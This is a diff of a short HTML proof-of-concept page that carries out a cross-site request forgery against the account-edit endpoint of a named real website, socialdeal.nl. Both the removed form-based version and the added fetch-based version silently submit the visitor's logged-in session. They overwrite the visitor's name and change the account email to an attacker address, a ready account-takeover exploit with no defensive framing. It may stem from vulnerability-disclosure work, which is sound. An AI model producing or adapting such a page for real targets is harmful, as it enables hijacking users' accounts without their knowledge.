@@ -1,13 +1,31 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <form action="https://www.socialdeal.nl/modal/account/edit/" method="POST" target="_blank">
-      <input type="hidden" name="salutation" value="female">
-      <input type="hidden" name="firstName" value="HACKED">
-      <input type="hidden" name="lastName" value="HACKED">
-      <input type="hidden" name="birthDate" value="1996-05-05">
-      <input type="hidden" name="email" value="attacker@evil.com">
-    </form>
-    <script>document.forms[0].submit();</script>
-  </body>
+<body>
+<script>
+(async () => {
+  const params = new URLSearchParams();
+  params.append('salutation', 'male');
+  params.append('firstName', 'HACKED');
+  params.append('lastName', 'HACKED');
+  params.append('birthDate-day', '5');
+  params.append('birthDate-month', '5');
+  params.append('birthDate-year', '1996');
+  params.append('email', 'attacker@evil.com');
+  
+  const resp = await fetch('https://www.socialdeal.nl/modal/account/edit/', {
+    method: 'POST',
+    credentials: 'include',
+    mode: 'no-cors',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: params.toString()
+  });
+  
+  // With no-cors we can't read the response, but the request still goes through
+  console.log('Request sent', resp.status);
+  document.body.innerHTML = '<h1>Request sent - check if email changed</h1>';
+})();
+</script>
+</body>
 </html>
